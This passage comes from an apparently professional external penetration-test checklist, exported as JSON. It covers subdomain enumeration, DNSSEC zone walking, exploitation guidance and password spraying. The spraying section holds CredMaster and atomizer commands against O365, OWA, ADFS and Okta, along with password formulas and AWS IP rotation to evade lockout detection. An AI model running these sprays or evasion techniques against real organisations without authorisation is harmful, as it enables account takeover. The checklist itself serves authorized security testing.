related service have vulnerabilities.</li>\n<li>Take a screen shot of the command and command output for the email domain that does not have an SPF record.</li>\n</ul>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "SubDomains - Amass",
                        "state": 2,
                        "comments": 1,
                        "uid": "c41806c6-2af0-11ee-91ba-7738e306a743",
                        "ordinal": 3,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nRun OWASP Amass and review the discovered subdomains.\n\n<h2><b>Variation: Amass</b></h2>\n 1. Install amass via apt.\n<ncode>sudo apt install amass\n</ncode>\n2. Run amass against discovered domain names.\n<ncode>amass intel -whois -d netspi.com\namass enum -d netspi.com\n</ncode>\n<h3>Example:</h3>\n<ncode><b>amass enum -d netspi.com</b>\n\nresolve-poc7.netspi.com\nresolve-poc5.netspi.com\nrepository-ext.netspi.com\nresolve-poc8.netspi.com\nresolve-poc10.netspi.com\n<b>[TRUNCATED]</b>\n\nOWASP Amass v3.19.2                               https://github.com/OWASP/Amass\n--------------------------------------------------------------------------------\n60 names discovered - cert: 47, scrape: 2, dns: 7, crawl: 1, archive: 3\n--------------------------------------------------------------------------------\nASN: 397919 - AS397919\n        76.76.14.0/24           13   Subdomain Name(s)\nASN: 15169 - GOOGLE - Google LLC\n        34.120.0.0/14           5    Subdomain Name(s)\nASN: 16509 - AMAZON-02 - Amazon.com, Inc.\n        2600:9000:2038::/45     8    Subdomain Name(s)\n        18.188.0.0/16           1    Subdomain Name(s)\n        13.227.36.0/22          4    Subdomain Name(s)\n        3.16.0.0/14             1    Subdomain Name(s)\n        3.20.0.0/14             1    Subdomain Name(s)\n        13.225.41.0/24          4    Subdomain Name(s)\n        108.156.88.0/21         4    Subdomain Name(s)\n        18.224.0.0/14           1    Subdomain Name(s)\n        18.66.248.0/22          4    Subdomain Name(s)\n        13.225.60.0/22          4    Subdomain Name(s)\n        99.84.36.0/22           4    Subdomain Name(s)\n        108.156.104.0/21        4    Subdomain Name(s)\nASN: 8075 - MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation\n        40.68.0.0/14            1    Subdomain Name(s)\n        13.64.0.0/11            4    Subdomain Name(s)\n        52.96.0.0/14            4    Subdomain Name(s)\n        2603:1000::/26          4    Subdomain Name(s)\n        52.146.0.0/15           1    Subdomain Name(s)\nASN: 0 - Reserved Network Address Blocks\n        240.0.0.0/4             1    Subdomain Name(s)\nASN: 54113 - FASTLY - Fastly\n        185.199.108.0/22        8    Subdomain Name(s)\n        2606:50c0:8000::/46     8    Subdomain Name(s)\nASN: 14618 - AMAZON-AES - Amazon.com, Inc.\n        54.144.0.0/14           3    Subdomain Name(s)\n        34.192.0.0/12           6    Subdomain Name(s)\n        34.224.0.0/12           3    Subdomain Name(s)\n        54.236.64.0/18          1    Subdomain Name(s)\n        50.17.0.0/16            1    Subdomain Name(s)\n        107.22.0.0/16           1    Subdomain Name(s)\n        3.208.0.0/12            5    Subdomain Name(s)\n        3.224.0.0/12            2    Subdomain Name(s)\n        54.164.0.0/15           2    Subdomain Name(s)\n        52.2.0.0/15             1    Subdomain Name(s)\n        54.166.0.0/15           1    Subdomain Name(s)\n        52.72.0.0/15            1    Subdomain Name(s)\n        54.92.128.0/17          1    Subdomain Name(s)\n        3.208.0.0/13            1    Subdomain Name(s)\n        18.204.0.0/14           1    Subdomain Name(s)\n        54.156.0.0/14           1    Subdomain Name(s)\n        35.168.0.0/13           2    Subdomain Name(s)\n        52.44.0.0/15            1    Subdomain Name(s)\n\nThe enumeration has finished\nDiscoveries are being migrated into the local database\n</ncode>\n4. Review domains, sub domains, and ip address ranges.\n\n<h2><b>Reporting Requirements</b></h2>\nRecord the newly discovered domains in the task notes and include them in the vulnerability scanning process if they are in scope.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "SubDomains - GetAllURLs",
                        "state": 2,
                        "comments": 0,
                        "uid": "c4192a06-2af0-11ee-91bf-9352ac255d34",
                        "ordinal": 5,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nReview tool output for subdomains.\n\n<h2>Variation: GetAllURLs</h2>\n1. Download gau and build with go:\n<ncode>$ git clone https://github.com/lc/gau.git\n$ cd gau/cmd\n$ go build\n$ sudo mv gau /usr/local/bin/\n</ncode>\nOr install via go:\n<ncode>$ go install github.com/lc/gau/v2/cmd/gau@latest\n</ncode>\nOr download and run the pre-built binary:\n<ncode>Download appropriate binary from https://github.com/lc/gau/releases/\n\n$ tar xvf gau_&lt;version&gt;_linux_amd64.tar.gz\n$ mv gau /usr/bin/gau\n</ncode>\n\n2. Run the tool.\n<ncode>gau --subs --threads 20 netspi.com | awk -F/ '{print $3}' | sed -e 's/:.&#42;//' -e 's/^www\\.//' | sort -u\n</ncode>\n<h3>Examples:</h3>\n<ncode>$ printf example.com | gau\n$ cat domains.txt | gau --threads 5\n$ gau example.com google.com\n$ gau --o example-urls.txt example.com\n$ gau --blacklist png,jpg,gif example.com\n</ncode>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "DNSSEC (Zone Walking)",
                        "state": 2,
                        "comments": 1,
                        "uid": "c4177788-2af0-11ee-91b6-97d26c129fb5",
                        "ordinal": 1,
                        "masterFindingId": 17063351,
                        "taskInstructions": "<h2>Instructions</h2>\nDetermine if DNSSEC is configured for domains. If so, DNS enumeration might be possible if NSEC records are used. If NSEC3 records are used, enumeration is not possible.\n\n<h2>Variation: delv</h2>\n1. Use the linux tool delv to determine if DNSSEC is configured.\n<ncode>delv @1.1.1.1 domain\n</ncode>\n<h3>Example:</h3>\n<ncode>delv @1.1.1.1 cyberciti.biz\n\n; fully validated\ncyberciti.biz.          300     IN      A       172.66.40.203\ncyberciti.biz.          300     IN      A       172.66.43.53\ncyberciti.biz.          300     IN      RRSIG   A 13 2 300 20220511212602 20220509192602 34505 cyberciti.biz. 0+LplFzevJJgd03MwlUQZ/UJ3yhfF8QMwf76vKTorglUqoV8BiFV9WdE BXpKN4E067iVA15m7usBkVLDFJsuaA==\n</ncode>\n<h2>Variation: dnsrecon</h2>\n1. Install dnsrecon.\n<ncode>sudo apt install dnsrecon\n</ncode>\n2. Run the following command to determine if DNSSEC is configured.\n<ncode>dnsrecon -z -d domain\n</ncode>\n<h3>Example:</h3>\n<ncode>dnsrecon -z -d cyberciti.biz\n\n[&#42;] std: Performing General Enumeration against: cyberciti.biz...\n[&#42;] DNSSEC is configured for cyberciti.biz\n[&#42;] DNSKEYs:\n[&#42;]     <b><red>NSEC</red></b> KSk ECDSAP256SHA256 99db2cc14cabdc33d6d77da63a2f15f7 1112584f234e8d1dc428e39e8a4a97e1 aa271a555dc90701e17e2a4c4b6f120b 7c32d44f4ac02bd894cf2d4be7778a19\n[&#42;]     <b><red>NSEC</red></b> ZSK ECDSAP256SHA256 a09311112cf9138818cd2feae970ebbd 4d6a30f6088c25b325a39abbc5cd1197 aa098283e5aaf421177c2aa5d714992a 9957d1bcc18f98cd71f1f1806b65e148\n[&#42;]      SOA dns1.cyberciti.biz 162.159.8.215\n[&#42;]      SOA dns1.cyberciti.biz 2400:cb00:2049:1::a29f:8d7\n[&#42;]      NS dns1.cyberciti.biz 162.159.8.215\n[&#42;]      NS dns1.cyberciti.biz 2400:cb00:2049:1::a29f:8d7\n[&#42;]      NS dns2.cyberciti.biz 162.159.9.173\n[&#42;]      NS dns2.cyberciti.biz 2400:cb00:2049:1::a29f:9ad\n[&#42;]      MX aspmx.l.google.com 172.253.115.27\n[&#42;]      MX aspmx2.googlemail.com 209.85.202.27\n[&#42;]      MX aspmx3.googlemail.com 64.233.184.27\n[&#42;]      MX alt1.aspmx.l.google.com 209.85.202.26\n[&#42;]      MX alt2.aspmx.l.google.com 64.233.184.26\n[&#42;]      MX aspmx.l.google.com 2607:f8b0:4004:c06::1b\n[&#42;]      MX aspmx2.googlemail.com 2a00:1450:400b:c00::1b\n[&#42;]      MX aspmx3.googlemail.com 2a00:1450:400c:c0b::1a\n[&#42;]      MX alt1.aspmx.l.google.com 2a00:1450:400b:c00::1b\n[&#42;]      MX alt2.aspmx.l.google.com 2a00:1450:400c:c0b::1b\n[&#42;]      A cyberciti.biz 172.66.43.53\n[&#42;]      A cyberciti.biz 172.66.40.203\n[&#42;]      AAAA cyberciti.biz 2606:4700:3108::ac42:2b35\n[&#42;]      AAAA cyberciti.biz 2606:4700:3108::ac42:28cb\n[&#42;]      TXT cyberciti.biz brave-ledger-verification=9b45e603f27d089b39fc038e0ce00c04056d101932a15f612ff58d011fe2f623\n[&#42;]      TXT cyberciti.biz v=spf1 include:amazonses.com include:_spf.google.com -all\n[&#42;]      TXT cyberciti.biz google-site-verification=oQAwJ5x8VLFhvc1DNXq_pHA0r2sF88et2Dv6hWNjzhg\n[&#42;]      TXT _dmarc.cyberciti.biz v=DMARC1; p=reject; pct=100; rua=mailto:webmaster@nixcraft.com; ruf=mailto:webmaster@nixcraft.com; fo=1; ri=2419200;\n[&#42;] Enumerating SRV Records\n[+] 0 Records Found\n[&#42;] <b><red>Performing NSEC Zone Walk for cyberciti.biz</red></b>\n[&#42;] Getting SOA record for cyberciti.biz\n[&#42;] Name Server 162.159.8.215 will be used\n[&#42;]      A cyberciti.biz 172.66.40.203\n[&#42;]      A cyberciti.biz 172.66.43.53\n[&#42;]      AAAA cyberciti.biz 2606:4700:3108::ac42:2b35\n[&#42;]      AAAA cyberciti.biz 2606:4700:3108::ac42:28cb\n[+] 4 records found\n</ncode>\n<h2>Report Requirements</h2>\n<ul><li>Record internal IPs in task notes</li>\n<li>Record newly discovered domains for later targeting</li>\n</ul>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "[ASM] TXT Records - Domain Validation Token",
                        "state": 2,
                        "comments": 0,
                        "uid": "c416630c-2af0-11ee-91b0-3f0fe8799131",
                        "ordinal": 9,
                        "masterFindingId": 17065336,
                        "taskInstructions": "<h2>Instructions</h2>\nIdentify third party SaaS providers being used. Sometimes they support federated/managed authentication without MFA.\n\n<h2>Variation: dig</h2>\n1. Use dig to query TXT records from the target domain.\n<ncode>dig txt domain.com +short\n</ncode>\n<h3>Example:</h3>\n<ncode>dig txt office.com +short\n&quot;google-site-verification=zqthuNzyDukN37Znr1L5xdDKHo7KZUL2LTyOqzU7cFo&quot;\n&quot;google-site-verification=WiCZ6HhPFmPMk5PTkdpSnevgiRttL2tQ-7QA_Z81JRk&quot;\n&quot;facebook-domain-verification=h6ulkdsze2qhdtbdnivt3lilquemgc&quot;\n&quot;google-site-verification=ntjPAtTot4dDzv9Z7WpQYYSlgVajPuBZx0FoZyRE8q8&quot;\n&quot;google-site-verification=iJN6qYrMLZmqRE70EPwnmUtT7qW3Rs-X3_wgil1YQjw&quot;\n&quot;google-site-verification=V6qxrpALPrk4N8F9wqgUVMwFdKi4sSUY5dLaICCx5rU&quot;\n&quot;google-site-verification=9aqt6mNhLx_inDlQjEfPiqq_TYfy72IFpoUh5_gijEg&quot;\n</ncode>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Upload List of Domains/Subdomains",
                        "state": 2,
                        "comments": 0,
                        "uid": "c4171a36-2af0-11ee-91b3-23f266110c17",
                        "ordinal": 17,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\n1. Upload a list of the enumerated Domains/Subdomains to the Documents section of the Resolve Platform.\n2. Please place contents in a well labeled .csv or .xls document.\n3. When possible include the IP, Domain, Subdomain and enumeration source. (and IP owner if you have it)\n4. Make sure to publish it so it is visible to the client in Track.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    }
                ],
                "fields": []
            },
            {
                "ordinal": 15,
                "id": 350453,
                "name": "Exploitation Guidance",
                "description": "This group of tasks is intended to provide basic guidance during exploitation.",
                "categoryType": "None",
                "tasks": [
                    {
                        "name": "Write Access Guidance",
                        "state": 3,
                        "comments": 0,
                        "uid": "c419c650-2af0-11ee-91c3-e7c7d05d204a",
                        "ordinal": 1,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nThis item is intended to provide guidance for obtaining writ access to devices and information.\n\nIn order to use write access as an Entry Point you'll need to write code, content, or files to locations <b>where you can control their execution or inject an authentication token</b>.  \n\nVulnerabilities can potentially allow write access to the follow areas:\n<ul><li>Memory</li>\n<li>File System</li>\n<li>Registry</li>\n<li>Database</li>\n</ul>\nThere are primarily two scenarios you'll run into regarding file access, restricted and arbitrary write access. It can be used as a general example for the other areas.\n\n<b>Restricted file write</b>\nThe vulnerability provides write access to files, but it is restricted to a specific file or path.\n\n<b>Arbitrary file write</b>\nThe vulnerability provides write access any file or path. The only thing restricting write access to files in this scenario are the privileges of the acting user. In most cases that will be a service account of some kind.\nFor example, the account running IIS may not have write access the all users startup directory.\n\n<b>Questions to ask yourself</b>\n<ol><li>What files and paths can I write to?</li>\n<li>Where are OS and application autorun locations?</li>\n<li>Do I have administrative write access?</li>\n<li>Can I write my own authentication tokens within the application or OS?</li>\n<li>If yes, then how do I use them to login?</li>\n<li>If not, then write the finding up and move on.</li>\n</ol>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Credential Access Guidance",
                        "state": 3,
                        "comments": 0,
                        "uid": "c4199d06-2af0-11ee-91c2-5705751cf2e4",
                        "ordinal": 3,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nThis item is intended to provide guidance for obtaining credential access from devices.\n\nAttempt to log into application and management interfaces that support the authentication method. Then attempt to pivot through that medium into the internal network zones. If MFA exists, take a little to time to understand if a bypass is possible via self-service portals or other options.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Read Access Guidance",
                        "state": 3,
                        "comments": 0,
                        "uid": "c4196372-2af0-11ee-91c1-332f958a03c5",
                        "ordinal": 0,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nThis item is intended to provide guidance for obtaining read access to devices and information.\n\nIn order to use read access as an entry point you'll need to find <b>authentication tokens</b>. Those include thinks like passwords, session cookies, and private keys. To increase your luck, research the OS and installed applications to determine where they store that type of information by default. Then, simply use the passwords, session cookies, or keys to login.\n\nVulnerabilities can potentially allow read access to:\n<ul><li>Memory</li>\n<li>File System</li>\n<li>Registry</li>\n<li>Database</li>\n</ul>\n<b>Questions to ask yourself:</b>\n<ol><li>What files and paths can I read from?</li>\n<li>Where does the OS and installed applications store credentials?</li>\n<li>Can I read privileged files (do I have root/administrator)?</li>\n<li>Can I read any authentication tokens?</li>\n<li>If yes, then how do I use them to login?</li>\n<li>If not, then write the finding up and move on.</li>\n</ol>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Execute Access Guidance",
                        "state": 3,
                        "comments": 0,
                        "uid": "c4193a28-2af0-11ee-91c0-7333a682953e",
                        "ordinal": 2,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nThis item is intended to provide guidance for obtaining execution access to devices.\n\nThese types of issues allow direct code execution within the context of the service account. This is typically a canned exploit or unauthorized access to functionality that is intended to execute commands or code.\n\nThe general guidance is find a safe reliable exploit to run. Review the verification instructions. If a vulnerability recommendation does not already exist make sure to get a second opinion before running as exploit.\n\nIf you are targeting existing functionality in an application, database, or operating system, then read the documentation for guidance.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    }
                ],
                "fields": []
            },
            {
                "ordinal": 13,
                "id": 350454,
                "name": "Vulnerability Enumeration: Dictionary Attacks",
                "description": "The goal of this group of tasks is to combine the Active Directory domain information, usernames, software information, and service fingerprinting information from earlier phases and leverage them to guess valid passwords.",
                "categoryType": "None",
                "tasks": [
                    {
                        "name": "Password Guessing - Active Directory",
                        "state": 2,
                        "comments": 1,
                        "uid": "c41a3892-2af0-11ee-91c6-afb4d5338bc9",
                        "ordinal": 1,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nPerform password guessing against Active Directory endpoints.\n\n<h3><b>Testing Guidance</b></h3>\n- Ask the client for their Active Directory password policy and review it prior to performing password spraying. Tailor the tool arguments as needed to ensure users are not being locked out. Treat clients with <i>Account lockout duration = 0</i> with special care since this means that if a user is locked, an admin must manually unlock it.\n- Prior to spraying, obtain a list of potential users by completing the Reconnaissance: Employees section of the checklist.\n- Make sure to use the correct domain when spraying.\n- Test no more than two passwords per user per hour, or less depending on the organization's password policy.\n\n<h3><b>Passwords to Use</b></h3>\nBelow is a list of password formulas that should be used during initial password guessing.\n\n1.) Season year variations\nYou may need to try multiple years or seasons depending on when the test is executed. Alternatively, the month can also be used.\n<h3>Examples:</h3>\n<ncode>Winter18! \nWinter2018!\n</ncode>\n2.) Company name variations\nIn some cases company abbreviations are also used in passwords, or the industry.\n<h3>Examples:</h3>\n<ncode>Company12, \nCompany12!\nCompanyBank!\nCompanybank12\n</ncode>\n3.) Variations  of password commonly found during engagements.\n<h3>Examples:</h3>\n<ncode>Abc12345\nPassword1\n</ncode>\n4.) Username as password.\n\n5.) Blank password.\n\n<h3>Password list generating tool</h3>\nAlternatively, use a tool to build a short password list. This tool will generate lists of passwords that include seasons, months, common weak passwords, and passwords based on whatever keywords are passed to it.\n\n1.) Download from GitHub.\n<ncode>git clone https://github.com/BarrelTit0r/password-spraying-list-generator\n</ncode>\n2.) Create a short list of keywords relevant to the company or region.\n<ncode>cat keywords.txt\nBigbank\nMinnesota\nVikings\n</ncode>\n3.) Use the tool to generate a list.\n<ncode>python3 pwlist_generatory.py keywords.txt &gt; passwords.txt\n</ncode>\n4.) Depending on the password policy, it may be useful to trim down the list to meet length or complexity requirements.\n<ncode>pw-inspector -i passwords.txt -m 8 &gt; trimmed_passwords.txt\n</ncode>\n\n<h3><b>Supplementing OSINT Lists</b></h3>\nIf your list of usernames/emails gathered from OSINT is on the small side, consider supplementing it with additional names from the statistically-likely-usernames repository. Choose the list that matches the email/username format you've determined to be correct for the client, merge it with your OSINT list, and then deduplicate the list. The lists in the repo can have 50k+ names, so only supplement your list with a portion (500-1000) of additional names from the repository list. No need to password spray against 50k+ usernames.\n\n<a href='https://github.com/insidetrust/statistically-likely-usernames'>https://github.com/insidetrust/statistically-likely-usernames</a>\n\n<h3><b>Target Common Interfaces</b></h3>\nTarget common internet exposed interfaces that support Active Directory domain authentication. For example:\n\nWeb apps (Burp/CredMaster)\nOutlook Web Access (OWA) (CredMaster/Metasploit/Silent Break Blogs)\nAzure/O365 (CredMaster)\nADFS (CredMaster)\nVPN  (Common Metasploit Modules)\nAWS (Burp)\n\n<h3>Tools</h3>\n<b>CredMaster (https://github.com/knavesec/CredMaster)</b>\n<b><i>General Information:</i></b>\nCredMaster is the preferred tool for most password spraying scenarios. It contains a number of plugins that target different types of endpoints. It uses AWS Amazon API Gateway to randomize and rotate the origin IPs of the spraying traffic, making it more difficult for things like Azure Smart Lockout and other throttling detection engines to spot the password spray. \n\nSome initial setup is required:\n1. Create an IAM user in NetSPI's Services AWS account\n2. Add the user to the ProxyGroup group\n3. Generate an API key for the user and save the access key + secret access key in PasswordState\n\nOnce AWS API keys have been generated, they can be used on the command line when executing the tool.\n\n<b><i>Plugin Information</i></b>\nSuggested plugin commands are shown below, but the latest plugin information can always be obtained here: <a href='https://github.com/knavesec/CredMaster/wiki/Plugin-Overview'>https://github.com/knavesec/CredMaster/wiki/Plugin-Overview</a>\n\n<i>O365Enum</i> <i>- Office365 User Enum</i>\n- Enumerates users on Managed Office365 instances using the &quot;login.microsoft.com&quot; URL method\n- The script warns if throttling is detected\n- Suggested command:\n<ncode>python3 credmaster.py --access_key {aws-access-key} --secret_access_key {aws-secret-access-key} --plugin o365enum -u {username-file} -a useragents.txt -o {output-file} --header &quot;X-NetSPI-ExPen: expen.support@netspi.com&quot;\n</ncode>\n<i>GmailEnum- Gmail User Enumeration</i>\n- Enumerates users on GMail GSuite instances\n- Suggested command:\n<ncode>python3 credmaster.py --access_key {aws-access-key} --secret_access_key {aws-secret-access-key} --plugin gmailenum -u {username-file} -a useragents.txt -o {output-file} --header &quot;X-NetSPI-ExPen: expen.support@netspi.com&quot;\n</ncode>\n<i>OWA - Outlook Web Access</i>\n- Sprays an organization's on-prem OWA login portal\n- Requires one additional argument, <ncode>--url</ncode>\n- On-prem OWA doesn't have any throttle detection/prevention, but lockouts can still occur\n- Suggested command:\n<ncode>python3 credmaster.py --plugin owa --url https://{domain} -u {username-file} -p {password-file} -a useragents.txt -o {output-file} -t 15 -d 60 --passwordsperdelay 1 --header &quot;X-NetSPI-ExPen: expen.support@netspi.com&quot;\n</ncode>\n<i>EWS - Exchange Web Services </i>\n- Sprays an organization's on-prem EWS login portal\n- Requires one additional argument, <ncode>--url</ncode>\n- On-prem EWS doesn't have any throttle detection/prevention, but lockouts can still occur\n- Suggested command:\n<ncode>python3 credmaster.py --plugin ews --url https://{domain} -u {username-file} -p {password-file} -a useragents.txt -o {output-file} -t 15 -d 60 --passwordsperdelay 1 --header &quot;X-NetSPI-ExPen: expen.support@netspi.com&quot;\n</ncode>\n<i>ADFS - Active Directory Federation Services</i>\n- Sprays on-prem ADFS instances using the &quot;/adfs/ls/&quot; method.\n- Requires one additional argument, --url\n- Can employ Smart Lockout for password spraying\n- Suggested command:\n<ncode>python3 credmaster.py --access_key {aws-access-key} --secret_access_key {aws-secret-access-key} --plugin adfs --url https://{adfs-domain} -u {username-file} -p {password-file} -a useragents.txt -o {output-file} -t 5 -j 20 -m 10 -d 60 --passwordsperdelay 1 --header &quot;X-NetSPI-ExPen: expen.support@netspi.com&quot;\n</ncode>\n<i>O365 - Office365</i>\n- Sprays Office365 instances using the &quot;autodiscover-s.outlook.com&quot; URL method\n- Throttle detection/prevention and/or IP blocking may occur\n- Azure SmartLockout may apply to rate limit requests if not using rotating IPs\n- Suggested command:\n<ncode>python3 credmaster.py --access_key {aws-access-key} --secret_access_key {aws-secret-access-key} --plugin o365 -u {username-file} -p {password-file} -a useragents.txt -o {output-file} -t 5 -j 20 -m 10 -d 60 --passwordsperdelay 1 --header &quot;X-NetSPI-ExPen: expen.support@netspi.com&quot;\n</ncode>\n<i>MSOL - Microsoft Online</i>\n- Sprays managed Microsoft Online instances like Azure or a managed Office365 setup\n- Only for managed instances (not Federated)\n- Azure SmartLockout can apply to rate limit requests\n- Suggested command:\n<ncode>python3 credmaster.py --access_key {aws-access-key} --secret_access_key {aws-secret-access-key} --plugin msol -u {username-file} -p {password-file} -a useragents.txt -o {output-file} -t 5 -j 20 -m 10 -d 60 --passwordsperdelay 1 --header &quot;X-NetSPI-ExPen: expen.support@netspi.com&quot;\n</ncode>\n<i>AzureSSO - Azure AD Seamless SSO Endpoint</i>\n- Sprays Azure AD instances using the &quot;autologon.microsoftazuread-sso.com&quot; URL method\n- Requires one additional argument, <ncode>--domain</ncode>, that specifies the target Tenant domain\n- Azure Smart Lockout may apply to rate limit queries\n- Tool should notify you if Smart Lockout is detected \n- Suggested command:\n<ncode>python3 credmaster.py --access_key {aws-access-key} --secret_access_key {aws-secret-access-key} --plugin azuresso --domain {tenant-domain} -u {username-file} -p {password-file} -a useragents.txt -o {output-file} -t 5 -j 20 -m 10 -d 60 --passwordsperdelay 1 --header &quot;X-NetSPI-ExPen: expen.support@netspi.com&quot;\n</ncode>\n<i>Okta - Okta Authentication Portal</i>\n- Sprays an organization's Okta login portal\n- Requires one additional argument, <ncode>--url</ncode>\n- Prone to throttling, don't use more than a single thread\n- Suggested command:\n<ncode>python3 credmaster.py --access_key {aws-access-key} --secret_access_key {aws-secret-access-key} --plugin okta --url https://{domain}.okta.com -u {username-file} -p {password-file} -a useragents.txt -o {output-file} -t 1 -j 60 -m 30 -d 60 --passwordsperdelay 1 --header &quot;X-NetSPI-ExPen: expen.support@netspi.com&quot;\n</ncode>\n\n<b>TREVORSpray (https://github.com/blacklanternsecurity/TREVORspray)</b>\n- Recon tools + Cisco AnyConnect VPN module\n\n<b>SprayingToolkit (https://github.com/byt3bl33d3r/SprayingToolkit)</b>\n- Lync/Skype for Business + IMAP modules\n- Examples:\n<ncode>python atomizer.py owa contoso.com --recon\npython atomizer.py owa contoso.com 'Fall2018' emails.txt\npython atomizer.py lync contoso.com 'Fall2018' emails.txt\npython atomizer.py imap contoso.com 'Fall2018' emails.txt\n</ncode>\n<b>CredKing (https://github.com/ustayready/CredKing)</b>\n- GMail module\n\n<h3><b>Tools for Validating Conditional Access Policies + MFA Implementations</b></h3>\nhttps://github.com/dafthack/MFASweep\nhttps://github.com/thalpius/Microsoft-Azure-AD-Conditional-Access-Validator\n\n\n<h2><b>Reporting Requirements</b></h2>\nShow the user enumeration method, the Active Directory domain enumeration method, and the successful password guessing.\n\n<b>Please include the interface you guessed against, tool used, passwords used, and approximate time stamps as comments to this checklist item, e.g.</b>\n<ncode><b>12/21/20 @ 2:55PM</b>\n<b>Office365 via Atomizer</b>\n<b>NetSPI2020!</b>\n<b>NetSPI20!</b>\n</ncode>\n<b>Please also attach your list of usernames to the Documents section without showing in Track.</b>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Password Guessing - Management Protocols",
                        "state": 2,
                        "comments": 3,
                        "uid": "c419ebe4-2af0-11ee-91c4-8f14e23e7a6c",
                        "ordinal": 2,
                        "masterFindingId": null,
                        "taskInstructions": "<h2><b>Instructions</b></h2>\nGuess passwords for users over common management protocols.  Below is the prioritized approach you should use. Please note that should be done as time allows.\n\n1. Guess defaults\n2. Dictionary attack using known usernames for device using Fuzzdb or rockyou dictionaries. Also consider using common keyboard walks.\n3. Dictionary attack using common usernames and passwords. For example, test, admin, and administrator.\n\n<h3><b>Example protocols:</b></h3>\nFTP\nLDAP\nNFS\nRDP\nRSYNC\nSFTP\nSMB\nSSH\nTELNET\n\n<h2><b>Report Requirements</b></h2>\nShow the password guessing and sucessful login.\n\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Password Guessing - Web Portals",
                        "state": 2,
                        "comments": 1,
                        "uid": "c41a68e4-2af0-11ee-91c7-7f233c6b35c8",
                        "ordinal": 3,
                        "masterFindingId": null,
                        "taskInstructions": "<h2><b>Instructions</b></h2>\nNote: Review vulnerability scan results and web scraping results for potential targets.\n\nOnly test application credentials. DO NOT perform brute force dictionary attacks against domain credentials.\n\nDo this as time allows using the prioritized approach below:\n\n1. Target web based management interfaces first. Attempt <b>known user names </b>with the rockyou.txt or fuzzdb dictionaries using Burp. Also consider using common keyboard walks. They can be generated with kwprocessor.\n\n2. If that fails, attempt common user names like &quot;admin&quot;, &quot;administrator&quot;, and &quot;test&quot;, and the same dictionaries.\n\n3. If the application leaks information about users you maybe able to infer usernames. If not, just move on.\n\nUse your best judgement :)\n \n<b>Important Note</b>\nAfter you guess credentials, please <b>do not perform authenticated</b> scanning of of web applications. Most of those web applications are production and simply crawling some of them can have unintended consequences.\n\n<h2><b>Reporting Requirements</b></h2>\nShow screens of each step in the process and the successful login.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Target List - Users",
                        "state": 2,
                        "comments": 0,
                        "uid": "c41a1718-2af0-11ee-91c5-7341a3d52ec7",
                        "ordinal": 0,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nBuild a list of users from enumeration phases to target for password guessing against AD or O365 interfaces.\n\n<h3>Example</h3>\nBuild a target list from the following sources:\n\n<ul><li>Employee Enumeration</li>\n<li>Company File Enumeration - Docker repositories, Github</li>\n<li>Web Applications - Hard coded credentials</li>\n<li>Statistically Likely Usernames - https://github.com/insidetrust/statistically-likely-usernames</li>\n</ul>\nValidate usernames using either trevorspray or CredMaster before performing password sprays.\n<ul><li>https://github.com/blacklanternsecurity/TREVORspray</li>\n<li>https://github.com/knavesec/CredMaster</li>\n</ul>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    }
                ],
                "fields": []
            },
            {
                "ordinal": 5,
                "id": 350455,
                "name": "Reconnaissance: Cloud Platforms",
                "description": "",
                "categoryType": "None",
                "tasks": [
                    {
                        "name": "[OPTIONAL] Cloud Service Used - Akamai",
                        "state": 3,
                        "comments": 0,
                        "uid": "c41a8806-2af0-11ee-91c9-4702365ba6f9",
                        "ordinal": 9,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nReview the IP spaces associated with their environment and note if Akamai is used.\nAlso review the check in the company information category and update this if there is any Akamai cloud usage.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Cloud Service Used - CloudFlare",
                        "state": 2,
                        "comments": 1,
                        "uid": "c41b66d6-2af0-11ee-91cf-778f1670cfa6",
                        "ordinal": 6,
                        "masterFindingId": null,
